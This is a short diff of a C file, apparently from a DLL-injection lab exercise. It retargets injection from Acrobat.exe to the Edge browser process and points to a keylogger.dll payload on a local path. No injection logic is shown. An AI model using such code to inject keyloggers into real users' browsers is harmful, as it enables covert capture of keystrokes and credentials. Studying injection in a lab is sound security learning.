@@ -2,7 +2,7 @@
 #include <tlhelp32.h>
 #include <stdio.h>
 
-#define TARGET_PROCESS "Acrobat.exe"
+#define TARGET_PROCESS "msedge.exe"
 #define DLL_PATH "C:\\Users\\namkg\\Downloads\\dll-injection-lab-main\\dll-injection-lab-main\\week4-injection\\dll\\keylogger.dll"
 
 // DLL 인젝션 함수
